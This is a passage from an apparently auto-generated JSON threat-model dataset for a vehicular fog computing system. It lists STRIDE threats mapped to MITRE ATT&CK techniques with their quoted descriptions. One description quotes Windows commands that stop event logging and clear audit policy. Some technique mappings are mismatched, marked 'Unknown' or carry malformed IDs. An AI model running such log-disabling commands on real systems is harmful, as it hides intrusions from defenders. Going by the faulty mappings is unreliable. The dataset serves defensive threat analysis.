            "Scenario": "A compromised fog node is used to gain higher privileges on connected cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Compromised fog nodes have connections to cloud services with weak authentication.",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud services have weak authentication."
                },
                {
                    "Assumption": "Attackers can leverage compromised fog nodes to escalate their privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid if escalation paths exist."
                },
                {
                    "Assumption": "No advanced monitoring exists on interactions between fog nodes and cloud services.",
                    "Role": "System Designer",
                    "Condition": "Valid if interactions are not monitored."
                }
            ],
            "Potential Impact": "Enhanced access to cloud resources, leading to potential data breaches and service manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "fog node",
                "cloud services",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--6addddd9-aaaaa-c4dd-941c-d3aad47e63bb",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "5",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a smart vehicle to inject malicious data into the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles are equipped with communication capabilities to interact with fog nodes.",
                    "Role": "System Architect",
                    "Condition": "Valid if spoofed communication can be initiated."
                },
                {
                    "Assumption": "There is a lack of proper authentication mechanisms between vehicles and fog nodes.",
                    "Role": "System Developer",
                    "Condition": "Valid if communication occurs without strong authentication."
                },
                {
                    "Assumption": "The attacker has physical or remote access to a smart vehicle.",
                    "Role": "Adversary",
                    "Condition": "Valid if an attacker compromises a vehicle or emulates it."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of data, Data corruption, System disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises a rogue RSU as a legitimate RSU to hijack data from passing vehicles.",
            "Assumptions": [
                {
                    "Assumption": "RSUs communicate directly with smart vehicles.",
                    "Role": "System Architect",
                    "Condition": "Valid if communication pathways include RSUs."
                },
                {
                    "Assumption": "There is insufficient validation of RSU identity by vehicles.",
                    "Role": "System Developer",
                    "Condition": "Valid if vehicles trust any RSU without verification."
                },
                {
                    "Assumption": "The attacker is able to deploy rogue RSUs in strategic locations.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has means to install rogue RSUs."
                }
            ],
            "Potential Impact": "Data interception, Data manipulation, Traffic disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "RSU",
                "vehicle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a fog node to gain access to sensitive data flowing between vehicles and legitimate fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes handle sensitive data from vehicles.",
                    "Role": "System Architect",
                    "Condition": "Valid if fog nodes process or store sensitive information from vehicles."
                },
                {
                    "Assumption": "The system lacks strong mutual authentication between fog nodes and vehicles.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if strong cryptographic measures are absent or flawed."
                },
                {
                    "Assumption": "The attacker has the capability to mimic a fog node.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker can emulate fog node communications."
                }
            ],
            "Potential Impact": "Unauthorized data access, Information leakage, Service interruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "fog node",
                "network",
                "data flow"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects false data into the fog nodes to manipulate traffic flow.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes influence traffic management decisions.",
                    "Role": "System Architect",
                    "Condition": "Valid if fog nodes are responsible for traffic-related decisions."
                },
                {
                    "Assumption": "Data from vehicles is processed without robust validation at fog nodes.",
                    "Role": "System Developer",
                    "Condition": "Valid if input validation is insufficient or flawed."
                },
                {
                    "Assumption": "The attacker can communicate with fog nodes directly or through compromised vehicles.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker gains access to communication channels."
                }
            ],
            "Potential Impact": "Data integrity compromised, Traffic disruption, Potential accidents.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data injection",
                "traffic management",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious firmware modification on roadside units (RSUs) leading to altered data processing.",
            "Assumptions": [
                {
                    "Assumption": "RSUs are firmware-based devices connected to the VFC system.",
                    "Role": "System Architect",
                    "Condition": "Valid if RSUs are firmware-controlled."
                },
                {
                    "Assumption": "Firmware updates lack secure validation and can be administered over the network.",
                    "Role": "System Developer",
                    "Condition": "Valid if update mechanisms are insecure."
                },
                {
                    "Assumption": "The attacker has the ability to compromise firmware updates.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker infiltrates firmware distribution processes."
                }
            ],
            "Potential Impact": "Data corruption, System reliability compromised, Service disruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "RSU",
                "network"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters communication pathways between fog nodes and cloud services to reroute data.",
            "Assumptions": [
                {
                    "Assumption": "Data between fog nodes and cloud services is critical for VFC operations.",
                    "Role": "System Architect",
                    "Condition": "Valid if this communication is essential."
                },
                {
                    "Assumption": "Communication pathways are susceptible to unauthorized modifications.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if routes can be altered without detection."
                },
                {
                    "Assumption": "The attacker can gain access to network infrastructure supporting fog-cloud communication.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker infiltrates network elements."
                }
            ],
            "Potential Impact": "Data integrity compromised, Potential data loss, Service interruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "fog node",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions on fog nodes but the actions cannot be traced back to them.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes perform critical data processing and decision-making.",
                    "Role": "System Architect",
                    "Condition": "Valid if fog nodes are key operational components."
                },
                {
                    "Assumption": "Logging and monitoring mechanisms are insufficient or not properly secured.",
                    "Role": "Security Administrator",
                    "Condition": "Valid if logging does not exist or is easily altered."
                },
                {
                    "Assumption": "The attacker has requisite access to manipulate logs or act without them being traced.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has access or means to bypass logging."
                }
            ],
            "Potential Impact": "Lack of accountability, Difficulty in incident investigation, Security policy non-compliance.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "fog node",
                "logging",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker triggers certain operations in vehicular applications and denies doing it due to insufficient logging.",
            "Assumptions": [
                {
                    "Assumption": "Vehicular applications rely on user or device actions for certain operations.",
                    "Role": "System Architect",
                    "Condition": "Valid if actions trigger specific outcomes in applications."
                },
                {
                    "Assumption": "There is inadequate logging of actions and operations within vehicular applications.",
                    "Role": "System Developer",
                    "Condition": "Valid if logging is insufficient or nonexistent."
                },
                {
                    "Assumption": "The attacker can perform actions that are not correlated with strong audit logs.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker acts within gaps of the logging system."
                }
            ],
            "Potential Impact": "Inability to trace actions, Compromised accountability, Undetected malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "vehicle",
                "logging",
                "operations"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies historical data stored in cloud services and repudiates the modifications.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services store historical and sensitive data from VFC operations.",
                    "Role": "System Architect",
                    "Condition": "Valid if cloud services are used for storage of important data."
                },
                {
                    "Assumption": "Historical data modifications are not strongly logged or audited.",
                    "Role": "Security Administrator",
                    "Condition": "Valid if history changes lack proper logging."
                },
                {
                    "Assumption": "The attacker has access to alter data without being detected or traced.",
                    "Role": "Adversary",
                    "Condition": "Valid if access controls and audits are weak."
                }
            ],
            "Potential Impact": "Data integrity compromised, Misleading analysis results, Security breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud services",
                "data integrity",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communication between smart vehicles and fog nodes to steal sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Data between vehicles and fog nodes include sensitive information.",
                    "Role": "System Architect",
                    "Condition": "Valid if vehicle-fog data is sensitive."
                },
                {
                    "Assumption": "Communication channels lack encryption or robust security.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if encryption is weak or lacking."
                },
                {
                    "Assumption": "The attacker has capabilities to perform network sniffing or interception.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has network access or sniffer tools."
                }
            ],
            "Potential Impact": "Unauthorized data access, Sensitive information leakage, Privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "data leakage",
                "sniffing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromise of cloud services results in the exposure of historical vehicular data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services store sensitive and historical data.",
                    "Role": "System Architect",
                    "Condition": "Valid if cloud services are primary data repositories."
                },
                {
                    "Assumption": "Cloud data lacks sufficient access controls or encryption.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if cloud data is not well protected."
                },
                {
                    "Assumption": "The attacker has access to cloud service accounts or endpoints.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker infiltrates cloud access credentials or endpoints."
                }
            ],
            "Potential Impact": "Unauthorized data access, Massive information exposure, Legal and regulatory repercussions.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud services",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to data streams between fog nodes and cloud services, leading to exposure of analytics results.",
            "Assumptions": [
                {
                    "Assumption": "Communication between fog nodes and the cloud contains substantial analytics data.",
                    "Role": "System Architect",
                    "Condition": "Valid if fog-cloud communication includes analytic outputs."
                },
                {
                    "Assumption": "Data streams are not adequately encrypted or secured.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if data streams lack encryption."
                },
                {
                    "Assumption": "The attacker can intercept data communication channels.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has access to the network or data streams."
                }
            ],
            "Potential Impact": "Exposure of analytic results, Information leakage, Compromised confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data stream",
                "analytics",
                "fog node"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack targeting fog nodes, disrupting vehicular communication and local processing.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes manage critical vehicular communications and processing.",
                    "Role": "System Architect",
                    "Condition": "Valid if fog nodes are central to operational workflows."
                },
                {
                    "Assumption": "Network infrastructure is susceptible to bandwidth exhaustion.",
                    "Role": "System Security Engineer",
                    "Condition": "Valid if network cannot handle high-volume attacks."
                },
                {
                    "Assumption": "The attacker has resources to generate high traffic volumes.",
                    "Role": "Adversary",
                    "Condition": "Valid if attacker has botnet or amplification tools."
                }
            ],
            "Potential Impact": "Service disruption, Data unavailability, Traffic management failure.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "fog node",
                "DDoS",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
